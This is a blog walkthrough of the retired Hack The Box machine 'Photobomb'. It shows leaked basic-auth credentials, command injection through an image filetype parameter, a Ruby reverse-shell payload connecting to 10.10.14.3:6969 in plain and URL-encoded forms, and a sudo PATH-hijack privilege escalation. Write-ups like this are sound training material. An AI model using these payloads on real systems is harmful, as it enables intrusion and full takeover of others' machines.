@@ -1,0 +1,210 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Photobomb HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Photobomb HTB Walkthrough"><meta property="og:description" content="Introduction An easy rated machine, and one of my first on HTB that was recently retired. This box was pwned before I started using MarkText and adding in screenshots to my markdown notes, so I&rsquo;ve only captured STDOUT here, and the entire write up is boring plain text.. sorry.
+As always, I use Parrot OS Security Edition in a VirtualBox VM, with the OpenVPN client to connect to the HackTheBox VPN."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-02-11-photobomb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-02-11T00:00:00+11:00"><meta property="article:modified_time" content="2023-02-11T08:11:20+11:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Photobomb HTB Walkthrough"><meta name=twitter:description content="Introduction An easy rated machine, and one of my first on HTB that was recently retired. This box was pwned before I started using MarkText and adding in screenshots to my markdown notes, so I&rsquo;ve only captured STDOUT here, and the entire write up is boring plain text.. sorry.
+As always, I use Parrot OS Security Edition in a VirtualBox VM, with the OpenVPN client to connect to the HackTheBox VPN."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-02-11-photobomb/><link rel=prev href=https://emdwyer.github.io/2023-01-29-ambassador-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Photobomb HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-02-11-photobomb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"pentesting, security, penetration testing, ctf, sinatra, sudo","wordcount":1275,"url":"https:\/\/emdwyer.github.io\/2023-02-11-photobomb\/","datePublished":"2023-02-11T00:00:00+11:00","dateModified":"2023-02-11T08:11:20+11:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Photobomb HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-02-11>2023-02-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1275 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;6 minutes&nbsp;<span id=/2023-02-11-photobomb/ class=leancloud_visitors data-flag-title="Photobomb HTB Walkthrough">
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./photobomb.png data-srcset="./photobomb.png, ./photobomb.png 1.5x, ./photobomb.png 2x" data-sizes=auto alt=./photobomb.png title=Photobomb></p><h2 id=introduction>Introduction</h2><p>An easy rated machine, and one of my first on HTB that was recently retired. This box was pwned before I started using <a href=https://github.com/marktext/marktext target=_blank rel="noopener noreffer">MarkText</a> and adding in screenshots to my markdown notes, so I&rsquo;ve only captured STDOUT here, and the entire write up is boring plain text.. sorry.</p><p>As always, I use <a href=https://www.parrotsec.org/download/ target=_blank rel="noopener noreffer">Parrot OS Security Edition</a> in a VirtualBox VM, with the OpenVPN client to connect to the HackTheBox VPN.</p><h2 id=enumeration>Enumeration</h2><p>Nmap -sC and -sV shows 22 (ssh) and http (80) open. Navigating to http://10.10.11.182/ redirects to <a href=http://photobomb.htb target=_blank rel="noopener noreffer">http://photobomb.htb</a>.
+After adding this domain to /etc/hosts, we see a landing page for Photobomb franchise, with a link to <a href=http://photobomb.htb/printer target=_blank rel="noopener noreffer">http://photobomb.htb/printer</a> &ndash; which presents a basic auth dialog.</p><p>Again, no screenshots, so you will need to use your imagination or just trust me.</p><p>Let&rsquo;s start up gobuster in the background while poking around:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://photobomb.htb -w /usr/share/dirb/wordlists/common.txt
+</span></span></code></pre></td></tr></table></div></div><p>This only returns a favicon and /printer plus /printers, both of which require a user/pass, but if I run gobuster with the <code>/usr/share/dirb/wordlists/big.txt</code> wordlist, I notice:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2022/12/25 13:06:09 Starting gobuster in directory enumeration mode
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/[                    (Status: 400) [Size: 273]
+</span></span><span class=line><span class=cl>/]                    (Status: 400) [Size: 273]
+</span></span><span class=line><span class=cl>/favicon.ico          (Status: 200) [Size: 10990]
+</span></span><span class=line><span class=cl>/plain]               (Status: 400) [Size: 278]  
+</span></span><span class=line><span class=cl>/printer              (Status: 401) [Size: 188]  
+</span></span><span class=line><span class=cl>/printer-friendly     (Status: 401) [Size: 188]  
+</span></span><span class=line><span class=cl>/printerfriendly      (Status: 401) [Size: 188]  
+</span></span><span class=line><span class=cl>/printer_friendly     (Status: 401) [Size: 188]  
+</span></span><span class=line><span class=cl>/printers             (Status: 401) [Size: 188]  
+</span></span><span class=line><span class=cl>/quote]               (Status: 400) [Size: 278]  
+</span></span></code></pre></td></tr></table></div></div><p>Manually checking some of the above:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Bad Request
+</span></span><span class=line><span class=cl>bad URI `/quote]&#39;.
+</span></span><span class=line><span class=cl>WEBrick/1.6.0 (Ruby/2.7.0/2019-12-25) at photobomb:4567 
+</span></span></code></pre></td></tr></table></div></div><p>So maybe I should look at WEBrick vulns.. but should quickly look at the rest of the site before going deep into a rabbit hole and never returning.</p><p>I found the following javascript <a href=http://photobomb.htb/photobomb.js target=_blank rel="noopener noreffer">http://photobomb.htb/photobomb.js</a>, which is requested when visiting the home page. I basically just leave the Firefox developer tools open and
+see what interesting looking requests are made, but intercepting via Burp Suite and looking at the Site map is also a good option here &ndash; especially as the number of files, directories and general structure of the site become larger and more complex. Burp suite will build up a better picture of what the site looks like over time as you navigate around, fire off requests, etc.</p><p>Anyway, the javascript file in question contains:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>init</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=c1>// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=sr>/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByClassName</span><span class=p>(</span><span class=s1>&#39;creds&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>setAttribute</span><span class=p>(</span><span class=s1>&#39;href&#39;</span><span class=p>,</span><span class=s1>&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nb>window</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=nx>init</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>Confirmed I am able to log in to http://pH0t0:b0Mb!@photobomb.htb/printer , which gives me a gallery of JPEG thumbnails along with a big red D<em>OWNLOAD PHOTO TO PRINT</em> button, and a drop-down to select the file format.</p><p>Burp suite captures the following when intercepting POST requests to download an image in a selected file format via the UI:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /printer HTTP/1.1
+</span></span><span class=line><span class=cl>Host: photobomb.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://photobomb.htb/printer
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>Content-Length: 79
+</span></span><span class=line><span class=cl>Origin: http://photobomb.htb
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Authorization: Basic cEgwdDA6YjBNYiE=
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Pragma: no-cache
+</span></span><span class=line><span class=cl>Cache-Control: no-cache
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&amp;filetype=jpg&amp;dimensions=3000x2000
+</span></span></code></pre></td></tr></table></div></div><p>After logging in, I can also hit the /printers endpoint I found earlier, which indicates it&rsquo;s a Sinatra app:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Sinatra doesn’t know this ditty.
+</span></span><span class=line><span class=cl>Try this:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>get &#39;/printers&#39; do
+</span></span><span class=line><span class=cl>  &#34;Hello World&#34;
+</span></span><span class=line><span class=cl>end
+</span></span></code></pre></td></tr></table></div></div><h2 id=foothold>Foothold</h2><p>I initially tried to use <a href=https://github.com/commixproject/commix target=_blank rel="noopener noreffer">commix</a> for command injection, but it kept erroring out. I then tried command injection into the photo param without any success. But then I was able to confirm command injection by sending the following payload to /printer:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;sleep 15&amp;dimensions=30x20
+</span></span></code></pre></td></tr></table></div></div><p>So, we basically escape the file type with a semi-colon <code>;</code>, no need for quotes, double-quotes etc.</p><p>I confirmed the endpoint appeared to become unresponsive for ~15 seconds as expected.
+I had issues with typical bash reverse shells, and assumed injecting into the file type was working as the application maybe (?) shells out to bash to run imagemagick or similar in order to convert the image format on the fly, but I was able to use a URL encoded ruby shell from <a href=https://revshells.com target=_blank rel="noopener noreffer">revshells.com</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ruby -rsocket -e&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.14.3&#34;,6969))&#39;
+</span></span></code></pre></td></tr></table></div></div><p>When injected, by setting Burp Suite to automagically HTML encode my payload, we end up sending the following in the body of the POST request:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.3%22%2C6969%29%29%27&amp;dimensions=30x20
+</span></span></code></pre></td></tr></table></div></div><p>I confirmed I now had a reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$nc -lvnp 6969
+</span></span><span class=line><span class=cl>listening on [any] 6969 ...
+</span></span><span class=line><span class=cl>connect to [10.10.14.3] from (UNKNOWN) [10.10.11.182] 50358
+</span></span><span class=line><span class=cl>python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span><span class=line><span class=cl>wizard@photobomb:~/photobomb$ id
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl>uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
+</span></span><span class=line><span class=cl>wizard@photobomb:~/photobomb$ find / -name &#39;user.txt&#39; 2&gt; /dev/null
+</span></span><span class=line><span class=cl>find / -name &#39;user.txt&#39; 2&gt; /dev/null
+</span></span><span class=line><span class=cl>/home/wizard/user.txt
+</span></span><span class=line><span class=cl>wizard@photobomb:~/photobomb$ cat /home/wizard/user.txt
+</span></span><span class=line><span class=cl>cat /home/wizard/user.txt
+</span></span><span class=line><span class=cl>0afc4ac78d0ff030a8ee3a05821cabf1
+</span></span></code></pre></td></tr></table></div></div><p>So I have the user flag, taken from wizard&rsquo;s account!</p><h2 id=privilege-escalation>Privilege Escalation</h2><p>Now on to privilege escalation. First, let&rsquo;s try the low hanging fruit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wizard@photobomb:~/photobomb$ sudo -l
+</span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> wizard on photobomb:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User wizard may run the following commands on photobomb:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> SETENV: NOPASSWD: /opt/cleanup.sh
+</span></span></code></pre></td></tr></table></div></div><p>So we can run <code>/opt/cleanup.sh</code>.. Looking at this script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
+</span></span><span class=line><span class=cl>cat /opt/cleanup.sh
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
+</span></span><span class=line><span class=cl>. /opt/.bashrc
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/wizard/photobomb
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># clean up log files</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -s log/photobomb.log <span class=o>]</span> <span class=o>&amp;&amp;</span> ! <span class=o>[</span> -L log/photobomb.log <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=k>then</span>
+</span></span><span class=line><span class=cl>  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+</span></span><span class=line><span class=cl>  /usr/bin/truncate -s0 log/photobomb.log
+</span></span><span class=line><span class=cl><span class=k>fi</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># protect the priceless originals</span>
+</span></span><span class=line><span class=cl>find source_images -type f -name <span class=s1>&#39;*.jpg&#39;</span> -exec chown root:root <span class=o>{}</span> <span class=se>\;</span>
+</span></span></code></pre></td></tr></table></div></div><p>The commands are absolute paths except for <code>find</code>. I tried copying <code>/bin/bash</code> to <code>/tmp/find</code>, and running the script while
+preserving my environment with the <code>-E</code> flag, which disables the env_reset option:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>PATH</span><span class=o>=</span><span class=s2>&#34;/tmp:</span><span class=nv>$PATH</span><span class=s2>&#34;</span> sudo -E /opt/cleanup.sh
+</span></span></code></pre></td></tr></table></div></div><p>So, when the shell attempts to run <code>find</code>, it first checks the <code>/tmp</code> directory, and instead would execute my copy of <code>bash</code>.</p><p>However, this wasn&rsquo;t working, and after a few minutes of digging through the <a href=https://man7.org/linux/man-pages/man8/sudo.8.html target=_blank rel="noopener noreffer">sudo man page</a> I noticed the env_reset in <code>sudo -l</code> output will reset the path, however also noticed that SETENV is enabled. So, I was able to pick up my fake find executable with a plain old:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wizard@photobomb:~/photobomb$ sudo <span class=nv>PATH</span><span class=o>=</span><span class=s2>&#34;/tmp:</span><span class=nv>$PATH</span><span class=s2>&#34;</span> /opt/cleanup.sh 
+</span></span><span class=line><span class=cl>root@photobomb:/home/wizard/photobomb# id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span><span class=line><span class=cl>root@photobomb:/home/wizard/photobomb# cat /root/root.txt
+</span></span><span class=line><span class=cl>adc699daf52cc1ba2c0d95e5cc85f007
+</span></span></code></pre></td></tr></table></div></div><p>So the <code>/opt/cleanup.sh</code> script runs as root, and locates the <code>find</code> command in <code>/tmp</code>, which is actually a copy of <code>bash</code> &ndash; giving us a root shell.</p><p>Machine completed!</p><p><a href=https://www.hackthebox.com/achievement/machine/329250/500 target=_blank rel="noopener noreffer">https://www.hackthebox.com/achievement/machine/329250/500</a></p><h2 id=conclusion>Conclusion</h2><p>Quite straight forward with basic web enumeration &ndash; a javascript file with hardcoded basic auth creds,
+leading into a basic web app that displays a photo gallery. Looking at web requests, we can see a param for filetype in the form data which we can inject into after failing to inject into filename.</p><p>I struggled to get a basic bash reverse shell working, but knowing the app is a Ruby-based Sinatra app, we can inject a Ruby reverse shell that calls out to <code>sh</code> and pipes the output to a TCP socket in order to gain foothold.</p><p>From here, we can take advantage of a script we can run as <code>sudo</code> by clobbering the expected <code>find</code> executable&rsquo;s location in <code>PATH</code>. While env_reset is enabled which causes commands to be executed with a minimal environment, the SETENV option is set, which allows us to prefix a directory to PATH &ndash; this directory is enumerated first, finding and executing our renamed <code>bash</code> command as <code>find</code> &ndash; giving us a root shell.</p><p>Looking forward to posting the next one!</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-02-11&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/d65d2dfc6be8d8a1f7915271dd55a904cb4e7158 target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) d65d2dfc6be8d8a1f7915271dd55a904cb4e7158: Add Photobomb HTB walkthrough">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>d65d2df</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-02-11-photobomb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-02-11-photobomb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-02-11-photobomb/ data-title="Photobomb HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-02-11-photobomb/ data-title="Photobomb HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-02-11-photobomb/ data-title="Photobomb HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pentesting/>pentesting</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/sinatra/>sinatra</a>,&nbsp;<a href=/tags/sudo/>sudo</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-01-29-ambassador-htb/ class=prev rel=prev title="Ambassador HTB 